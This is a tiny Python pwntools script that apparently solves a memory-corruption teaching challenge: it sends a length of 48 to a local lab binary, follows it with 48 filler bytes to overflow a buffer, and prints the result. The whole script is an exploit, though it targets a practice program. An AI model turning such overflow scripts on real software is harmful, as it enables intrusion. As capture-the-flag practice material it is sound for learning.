import pwn

io = pwn.process("/challenges/mem/level1_teaching1")

io.send("48\n")

payload = bytes([0x10]*0x30)

io.send(payload)

output = io.readall().decode('ascii')
print(output)